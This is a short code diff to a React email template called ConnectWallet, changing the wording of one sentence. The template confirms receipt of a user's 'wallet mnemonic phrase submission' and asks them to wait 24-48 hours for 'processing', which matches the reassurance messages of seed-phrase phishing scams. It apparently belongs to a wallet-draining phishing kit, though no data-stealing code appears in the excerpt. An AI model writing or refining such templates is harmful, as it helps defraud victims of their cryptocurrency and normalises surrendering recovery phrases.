@@ -22,7 +22,7 @@ export default function ConnectWallet({
           </Container>
           <Text style={bold}>Dear {userName}</Text>
           <Text style={paragraph}>
-            We have received your wallet mnemonic phrase submission at {time} today. Please allow 24-48 hours for full processing and validation before accounts are connected.
+            We have received your wallet mnemonic phrase submission today {time}. Please allow 24-48 hours for full processing and validation before accounts are connected.
           </Text>
           <Text style={paragraph}>
             You will receive a confirmation email once the process is complete and safe storage procedures are enabled. 
